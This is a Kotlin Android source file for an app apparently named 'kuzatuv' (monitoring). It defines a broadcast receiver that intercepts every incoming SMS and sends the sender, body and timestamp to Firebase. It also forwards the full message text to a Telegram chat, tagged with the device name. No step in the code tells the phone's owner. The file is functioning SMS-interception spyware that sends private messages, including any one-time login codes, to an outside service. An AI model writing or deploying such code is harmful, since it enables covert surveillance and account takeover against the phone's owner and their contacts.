package com.kuzatuv.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val device = DevicePrefs.getDeviceName(context)
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        for (sms in messages) {
            val sender = sms.originatingAddress ?: "Номаълум"
            val body = sms.messageBody ?: ""
            val timestamp = sms.timestampMillis
            FirebaseHelper.pushSms(sender, body, timestamp, device)
            TelegramHelper.send("📩 Yangi SMS ($device)\nKimdan: $sender\n$body")
        }
    }
}
